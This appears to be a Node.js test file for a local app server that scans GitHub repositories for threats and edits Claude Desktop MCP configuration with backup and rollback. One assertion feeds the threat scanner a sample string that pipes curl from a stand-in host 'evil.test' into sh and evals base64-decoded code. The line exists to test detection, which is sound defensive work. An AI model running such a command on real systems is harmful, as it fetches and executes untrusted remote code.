#!/usr/bin/env node
import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, readFile, readdir, writeFile } from "node:fs/promises";
import http from "node:http";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const scriptDir = path.dirname(fileURLToPath(import.meta.url));
const rootDir = path.resolve(scriptDir, "..");
await mkdir(path.join(rootDir, ".tmp"), { recursive: true });
const tmpRoot = await mkdtemp(path.join(rootDir, ".tmp", "app-server-"));
const originalEnv = snapshotEnv();
let server;

try {
  const appData = path.join(tmpRoot, "AppData", "Roaming");
  const localAppData = path.join(tmpRoot, "AppData", "Local");
  const home = path.join(tmpRoot, "Home");
  const programFiles = path.join(tmpRoot, "ProgramFiles");
  const programFilesX86 = path.join(tmpRoot, "ProgramFilesX86");
  Object.assign(process.env, {
    APPDATA: appData,
    LOCALAPPDATA: localAppData,
    HOME: home,
    USERPROFILE: home,
    XDG_CONFIG_HOME: path.join(home, ".config"),
    ProgramFiles: programFiles,
    "ProgramFiles(x86)": programFilesX86
  });

  const claudeConfigPath = path.join(appData, "Claude", "claude_desktop_config.json");
  await mkdir(path.dirname(claudeConfigPath), { recursive: true });
  const baseline = [
    "{",
    "  \"mcpServers\": {",
    "    \"existing-tool\": {",
    "      \"command\": \"node\",",
    "      \"args\": [\"existing.js\"],",
    "      \"env\": {",
    "        \"EXISTING_TOKEN\": \"keep-this-secret-value\"",
    "      }",
    "    }",
    "  }",
    "}",
    ""
  ].join("\n");
  await writeFile(claudeConfigPath, baseline, "utf8");

  const moduleUrl = `${pathToFileURL(path.join(rootDir, "scripts", "vnem-app-server.mjs")).href}?test=${Date.now()}`;
  const { getAppServerStatus, scanThreatSignatures, startVnemAppServer } = await import(moduleUrl);
  const status = getAppServerStatus({ port: 0, repositoryRoot: tmpRoot });
  assert.equal(status.host, "127.0.0.1");
  assert.ok(status.endpoints.includes("GET /api/connector/status"));
  assert.ok(status.endpoints.includes("POST /api/connector/apply"));
  assert.ok(status.endpoints.includes("GET /api/telemetry/stream"));
  assert.ok(status.endpoints.includes("POST /api/intelligence/target"));
  assert.equal(
    scanThreatSignatures("child_process.exec('curl https://evil.test/payload.sh | sh'); eval(Buffer.from('YWxlcnQ=', 'base64').toString())").risk_tier,
    "critical"
  );

  const mockFetch = createMockFetch();
  const started = await startVnemAppServer({
    port: 0,
    repositoryRoot: tmpRoot,
    fetchImpl: mockFetch,
    awaitInitialIntelligenceCycle: true,
    pollIntervalMs: 600000,
    stageDelayMs: 0
  });
  server = started.server;
  const port = started.config.port;
  assert.ok(Number.isInteger(port) && port > 0, "dynamic test port must be assigned");

  const connectorStatus = await requestJson(port, "GET", "/api/connector/status");
  assert.equal(connectorStatus.statusCode, 200);
  assertJsonContentType(connectorStatus);
  assert.equal(connectorStatus.body.scan_metadata.mode, "read-only");
  assert.equal(connectorStatus.body.detected_clients.claude_desktop.installed, true);

  const telemetryHistory = await requestJson(port, "GET", "/api/telemetry/history");
  assert.equal(telemetryHistory.statusCode, 200);
  assertJsonContentType(telemetryHistory);
  assert.equal(Array.isArray(telemetryHistory.body.active_ingestions), true);
  assert.ok(telemetryHistory.body.active_ingestions.length > 0, "live intelligence engine must expose baseline ingestions");
  assert.equal(telemetryHistory.body.active_ingestions[0].title, "ovvuh/vnem-agent-workflow");
  assert.equal(telemetryHistory.body.active_ingestions[0].current_agent, "complete");
  assert.equal(telemetryHistory.body.active_ingestions[0].status, "staged_for_review");
  assert.equal(telemetryHistory.body.active_ingestions[0].threat_score < 30, true);
  assert.equal(Array.isArray(telemetryHistory.body.route_errors), true);
  assert.equal(mockFetch.calls.some((url) => url.startsWith("https://api.github.com/search/repositories")), true);
  assert.equal(mockFetch.calls.some((url) => url.endsWith("/README.md")), true);
  const stagingFiles = await readdir(path.join(tmpRoot, ".vnem", "staging"));
  assert.equal(stagingFiles.length, 1, "Giving AI must stage exactly one dispatch file for the safe mocked repository");
  const stagedDispatch = await readFile(path.join(tmpRoot, ".vnem", "staging", stagingFiles[0]), "utf8");
  assert.match(stagedDispatch, /VNEM Live Intelligence Dispatch: ovvuh\/vnem-agent-workflow/);
  assert.match(stagedDispatch, /Threat score: 0%/);

  const target = await requestJson(port, "POST", "/api/intelligence/target", {}, JSON.stringify({
    query: "rust entity component system",
    threat_tolerance: 50
  }));
  assert.equal(target.statusCode, 202);
  assertJsonContentType(target);
  assert.equal(target.body.status, "retargeted");
  assert.equal(target.body.cycle_status, "started");
  assert.equal(target.body.mission.query, "rust entity component system");
  assert.equal(target.body.mission.threat_tolerance, 50);

  const retargetedHistory = await waitForTelemetryHistory(port, (body) => (
    body.mission?.query === "rust entity component system" &&
    body.pipeline?.mission?.threat_tolerance === 50 &&
    body.active_ingestions?.[0]?.title === "bevyengine/bevy" &&
    body.active_ingestions?.[0]?.status === "staged_for_review"
  ));
  assert.equal(retargetedHistory.body.active_ingestions[0].repository.query, "rust entity component system");
  assert.equal(retargetedHistory.body.active_ingestions[0].status, "staged_for_review");
  assert.equal(retargetedHistory.body.active_ingestions[0].protection_report.block_threshold, 50);
  assert.equal(mockFetch.calls.some((url) => url.includes("q=rust+entity+component+system")), true);

  const invalidTarget = await requestJson(port, "POST", "/api/intelligence/target", {}, JSON.stringify({
    query: "x",
    threat_tolerance: 30
  }));
  assert.equal(invalidTarget.statusCode, 400);
  assertJsonContentType(invalidTarget);
  assert.equal(invalidTarget.body.error_code, "QUERY_TOO_SHORT");

  const telemetry = await requestTelemetry(port);
  assert.equal(telemetry.statusCode, 200);
  assert.match(String(telemetry.headers["content-type"] || ""), /^text\/event-stream(?:;|$)/);
  assert.equal(telemetry.headers["cache-control"], "no-cache");
  assert.equal(telemetry.headers.connection, "keep-alive");
  assert.equal(telemetry.event.type, "connected");
  assert.equal(telemetry.event.message, "Telemetry bridge active");

  const preview = await requestJson(port, "GET", "/api/connector/preview");
  assert.equal(preview.statusCode, 200);
  assertJsonContentType(preview);
  assert.equal(preview.body.preview_metadata.mode, "read-only-preview");
  assert.equal(preview.body.preview_metadata.writes_performed, false);
  assert.ok(preview.body.previews.claude_desktop.target_config_state.mcpServers.vnem);
  assert.equal(JSON.stringify(preview.body).includes("keep-this-secret-value"), false, "preview output must redact secrets");

  const apply = await requestJson(port, "POST", "/api/connector/apply");
  assert.equal(apply.statusCode, 200);
  assertJsonContentType(apply);
  assert.equal(apply.body.mode, "apply");
  assert.equal(apply.body.results.claude_desktop.action, "applied");
  assert.equal(existsSync(`${claudeConfigPath}.vnem.bak`), true, "apply must create an adjacent backup");

  const modified = JSON.parse(await readFile(claudeConfigPath, "utf8"));
  assert.equal(modified.mcpServers["existing-tool"].env.EXISTING_TOKEN, "keep-this-secret-value");
  assert.ok(modified.mcpServers.vnem);
  assert.ok(modified.mcpServers["vnem-precision"]);

  const rollback = await requestJson(port, "POST", "/api/connector/rollback");
  assert.equal(rollback.statusCode, 200);
  assertJsonContentType(rollback);
  assert.equal(rollback.body.mode, "rollback");
  assert.equal(rollback.body.results.claude_desktop.action, "rolled-back");
  assert.equal(await readFile(claudeConfigPath, "utf8"), baseline, "rollback must restore the baseline byte-for-byte");
  assert.equal(existsSync(`${claudeConfigPath}.vnem.bak`), false, "rollback must remove the adjacent backup");

  const spoofedHost = await requestJson(port, "GET", "/api/connector/status", {
    Host: "192.168.1.50"
  });
  assert.equal(spoofedHost.statusCode, 403);
  assertJsonContentType(spoofedHost);
  assert.equal(spoofedHost.body.error, "local-only-request-rejected");

  const externalOrigin = await requestJson(port, "GET", "/api/connector/status", {
    Origin: "https://example.com"
  });
  assert.equal(externalOrigin.statusCode, 403);
  assertJsonContentType(externalOrigin);
  assert.equal(externalOrigin.body.reason, "non-local-origin-header");

  console.log("vnem app server tests passed");
} finally {
  if (server) {
    await closeServer(server);
  }
  restoreEnv(originalEnv);
}

function requestJson(port, method, route, headers = {}, body = null) {
  const requestHeaders = {
    Host: `127.0.0.1:${port}`,
    ...headers
  };
  if (body != null) {
    requestHeaders["content-type"] = requestHeaders["content-type"] ?? "application/json";
    requestHeaders["content-length"] = Buffer.byteLength(body);
  }

  return new Promise((resolve, reject) => {
    const request = http.request(
      {
        hostname: "127.0.0.1",
        port,
        path: route,
        method,
        headers: requestHeaders
      },
      (response) => {
        let text = "";
        response.setEncoding("utf8");
        response.on("data", (chunk) => {
          text += chunk;
        });
        response.on("end", () => {
          try {
            resolve({
              statusCode: response.statusCode,
              headers: response.headers,
              text,
              body: JSON.parse(text)
            });
          } catch (error) {
            reject(new Error(`Response was not valid JSON: ${error.message}; body=${text}`));
          }
        });
      }
    );
    request.on("error", reject);
    if (body != null) {
      request.write(body);
    }
    request.end();
  });
}

function requestTelemetry(port) {
  return new Promise((resolve, reject) => {
    let settled = false;
    const request = http.request(
      {
        hostname: "127.0.0.1",
        port,
        path: "/api/telemetry/stream",
        method: "GET",
        headers: {
          Host: `127.0.0.1:${port}`,
          Origin: "http://127.0.0.1:4174",
          Accept: "text/event-stream"
        }
      },
      (response) => {
        let text = "";
        response.setEncoding("utf8");
        response.on("data", (chunk) => {
          text += chunk;
          if (!settled && text.includes("\n\n")) {
            settled = true;
            response.destroy();
            resolve({
              statusCode: response.statusCode,
              headers: response.headers,
              text,
              event: parseSseData(text)
            });
          }
        });
      }
    );
    request.on("error", (error) => {
      if (!settled) {
        reject(error);
      }
    });
    request.end();
  });
}

function parseSseData(text) {
  const line = text.split(/\r?\n/).find((item) => item.startsWith("data: "));
  assert.ok(line, `SSE response must contain a data line: ${text}`);
  return JSON.parse(line.slice("data: ".length));
}

function assertJsonContentType(response) {
  assert.match(String(response.headers["content-type"] || ""), /^application\/json(?:;|$)/);
}

async function waitForTelemetryHistory(port, predicate) {
  const deadline = Date.now() + 1500;
  let latest = null;
  while (Date.now() < deadline) {
    latest = await requestJson(port, "GET", "/api/telemetry/history");
    if (predicate(latest.body)) {
      return latest;
    }
    await new Promise((resolve) => setTimeout(resolve, 20));
  }
  throw new Error(`Timed out waiting for telemetry history condition. Latest=${JSON.stringify(latest?.body)}`);
}

function closeServer(targetServer) {
  return new Promise((resolve, reject) => {
    targetServer.close((error) => {
      if (error) {
        reject(error);
      } else {
        resolve();
      }
    });
  });
}

function snapshotEnv() {
  const keys = ["APPDATA", "LOCALAPPDATA", "HOME", "USERPROFILE", "XDG_CONFIG_HOME", "ProgramFiles", "ProgramFiles(x86)"];
  return Object.fromEntries(keys.map((key) => [key, process.env[key]]));
}

function restoreEnv(snapshot) {
  for (const [key, value] of Object.entries(snapshot)) {
    if (value == null) {
      delete process.env[key];
    } else {
      process.env[key] = value;
    }
  }
}

function createMockFetch() {
  const calls = [];
  const mockFetch = async (url) => {
    const target = String(url);
    calls.push(target);
    if (target.startsWith("https://api.github.com/search/repositories")) {
      const query = new URL(target).searchParams.get("q");
      if (query === "rust entity component system") {
        return jsonFetchResponse({
          total_count: 1,
          incomplete_results: false,
          items: [
            {
              id: 300,
              name: "bevy",
              full_name: "bevyengine/bevy",
              html_url: "https://github.com/bevyengine/bevy",
              description: "A refreshingly simple data-driven game engine built in Rust with entity component system architecture.",
              owner: { login: "bevyengine" },
              default_branch: "main",
              stargazers_count: 45000,
              forks_count: 4500,
              language: "Rust",
              updated_at: "2026-05-31T12:00:00Z",
              pushed_at: "2026-05-31T12:00:00Z"
            }
          ]
        }, 200, {
          etag: "\"vnem-rust-test-etag\""
        });
      }
      return jsonFetchResponse({
        total_count: 2,
        incomplete_results: false,
        items: [
          {
            id: 100,
            name: "basic-script-dump",
            full_name: "example/basic-script-dump",
            html_url: "https://github.com/example/basic-script-dump",
            description: "Small unrelated test repository.",
            owner: { login: "example" },
            default_branch: "main",
            stargazers_count: 1,
            forks_count: 0,
            language: "JavaScript",
            updated_at: "2026-01-01T00:00:00Z",
            pushed_at: "2026-01-01T00:00:00Z"
          },
          {
            id: 200,
            name: "vnem-agent-workflow",
            full_name: "ovvuh/vnem-agent-workflow",
            html_url: "https://github.com/ovvuh/vnem-agent-workflow",
            description: "Agentic workflow architecture for Luau prompt planning, MCP context routing, and benchmarked development loops.",
            owner: { login: "ovvuh" },
            default_branch: "main",
            stargazers_count: 420,
            forks_count: 36,
            language: "TypeScript",
            updated_at: "2026-05-30T12:00:00Z",
            pushed_at: "2026-05-30T12:00:00Z"
          }
        ]
      }, 200, {
        etag: "\"vnem-test-etag\""
      });
    }
    if (target === "https://raw.githubusercontent.com/bevyengine/bevy/main/README.md") {
      return textFetchResponse([
        "# Bevy",
        "",
        "A safe Rust ECS architecture reference for game development, scheduling, and renderer organization.",
        "No shell bootstrapper or lifecycle install script is required."
      ].join("\n"));
    }
    if (target === "https://raw.githubusercontent.com/bevyengine/bevy/main/package.json") {
      return textFetchResponse("not found", 404);
    }
    if (target === "https://raw.githubusercontent.com/ovvuh/vnem-agent-workflow/main/README.md") {
      return textFetchResponse([
        "# vnem-agent-workflow",
        "",
        "A safe architecture note for agentic workflow planning, Luau game automation review, and MCP routing.",
        "No runtime shell execution is required."
      ].join("\n"));
    }
    if (target === "https://raw.githubusercontent.com/ovvuh/vnem-agent-workflow/main/package.json") {
      return textFetchResponse(JSON.stringify({
        scripts: {
          test: "node scripts/test.js"
        },
        dependencies: {
          zod: "^4.0.0"
        }
      }, null, 2));
    }
    return textFetchResponse("not found", 404);
  };
  mockFetch.calls = calls;
  return mockFetch;
}

function jsonFetchResponse(body, status = 200, headers = {}) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: headerReader(headers),
    async json() {
      return body;
    },
    async text() {
      return JSON.stringify(body);
    }
  };
}

function textFetchResponse(body, status = 200, headers = {}) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: headerReader(headers),
    async json() {
      return JSON.parse(body);
    },
    async text() {
      return body;
    }
  };
}

function headerReader(headers) {
  return {
    get(name) {
      return headers[String(name).toLowerCase()] ?? headers[name] ?? null;
    }
  };
}
